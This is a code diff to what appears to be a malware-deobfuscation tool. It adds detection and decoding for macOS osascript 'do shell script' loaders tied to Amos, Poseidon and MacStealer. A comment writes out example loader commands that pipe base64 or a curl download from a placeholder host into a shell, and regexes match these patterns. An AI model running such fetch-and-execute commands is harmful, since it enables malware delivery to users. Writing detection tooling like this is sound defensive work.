@@ -3411,7 +3411,91 @@ def _handle_blind_xor(text: str) -> str:
     return banner
 
 
+# ═══════════════════════════════════════════════════════════════════════
+# Feb 2026 v1.3.0 — macOS osascript archetype
+# Amos / Poseidon / MacStealer canonical loader:
+#   osascript -e 'do shell script "echo <b64> | base64 -d | sh"'
+#   osascript -e "do shell script (\"curl -sSL http://x | bash\")"
+# Also handles: `set p to do shell script ...`, chained `-e` args,
+# and `osascript -l JavaScript -e '...'` (JXA — JavaScript for Automation).
+# ═══════════════════════════════════════════════════════════════════════
+_OSASCRIPT_DO_SHELL_RX = re.compile(
+    r"osascript(?:\s+-l\s+\w+)?\s+(?:-e\s+[\"'][^\"']*[\"']\s*)*"
+    r"-e\s+[\"'](?P<inner>[^\"']*?do\s+shell\s+script[^\"']*?)[\"']"
+    r"|"
+    r"do\s+shell\s+script\s+[\"'\(](?P<inner2>[^\"'\)]{4,1000})[\"'\)]"
+    r"|"
+    r"osascript\s+-l\s+JavaScript\s+-e\s+[\"'](?P<jxa>[^\"']+)[\"']",
+    re.IGNORECASE | re.DOTALL,
+)
+
+_OSASCRIPT_B64_RX = re.compile(
+    r"echo\s+[\"']?(?P<blob>[A-Za-z0-9+/=_\-\s]{20,})[\"']?"
+    r"\s*\|\s*base64\s+(?:-d|--decode|-D)\s*\|\s*(?:sh|bash|zsh|dash|python\d?)",
+    re.IGNORECASE,
+)
+
+
+def _osascript_matches(text: str) -> bool:
+    if not re.search(r"osascript|do\s+shell\s+script", text, re.IGNORECASE):
+        return False
+    return bool(_OSASCRIPT_DO_SHELL_RX.search(text))
+
+
+def _handle_osascript(text: str) -> str:
+    m = _OSASCRIPT_DO_SHELL_RX.search(text)
+    if not m:
+        raise ValueError("no osascript match")
+    inner = (m.group("inner") or m.group("inner2") or m.group("jxa") or "").strip()
+
+    # Try to peel off an embedded base64 shell-pipe if present
+    decoded_shell = None
+    b64_match = _OSASCRIPT_B64_RX.search(inner)
+    if b64_match:
+        try:
+            decoded_shell = robust_b64decode(b64_match.group("blob")).decode(
+                "utf-8", errors="replace")
+        except Exception:
+            decoded_shell = None
+
+    # Extract IOCs / next-stage URL for annotation
+    url_match = re.search(r"https?://[^\s\"'<>]+", inner)
+    lang = "AppleScript"
+    if "jxa" in (m.groupdict() or {}) and m.group("jxa"):
+        lang = "JXA (JavaScript for Automation)"
+
+    banner_lines = [
+        "──── macOS_osascript_do_shell (v1.3.0) ────",
+        f"Language       : {lang}",
+        "Persistence    : usually paired with LaunchAgent plist (T1543.001)",
+        "Common family  : Amos / Poseidon / MacStealer / RustyStealer",
+        f"AppleScript    : {inner[:400]}{'…' if len(inner) > 400 else ''}",
+    ]
+    if url_match:
+        banner_lines.append(f"Next-stage URL : {url_match.group(0)}")
+    if decoded_shell:
+        banner_lines.append("Embedded pipe  : base64 → shell decoded below")
+        banner_lines.append(f"  ▸ {decoded_shell[:600]}")
+    banner_lines.append(
+        "MITRE ATT&CK   : T1059.002 (AppleScript) · T1140 · T1204.002 · "
+        "T1105 · T1543.001")
+
+    return f"{text}\n\n" + "\n".join(banner_lines)
+
+
 ARCHETYPES: List[Dict[str, Any]] = [
+    # ─── Feb 2026 v1.3.0 · macOS osascript loader ──────────────────────────
+    {
+        "id": "MACOS_OSASCRIPT_DO_SHELL",
+        "description": "macOS osascript `do shell script` loader — Amos / "
+                       "Poseidon / MacStealer canonical delivery. Peels the "
+                       "AppleScript, extracts embedded base64→shell pipe, "
+                       "surfaces next-stage URL.",
+        "chain":    ["osascript-extract", "applescript-decode"],
+        "handler":  _handle_osascript,
+        "match":    lambda t: _osascript_matches(t),
+        "terminal": False,
+    },
     # ─── Feb 2026 · Unified HEX-FAMILY (KHEX + XHEX + variants) ─────────────
     {
         "id": "PS_HEXFAMILY_UNIFIED_OBFUSCATION",
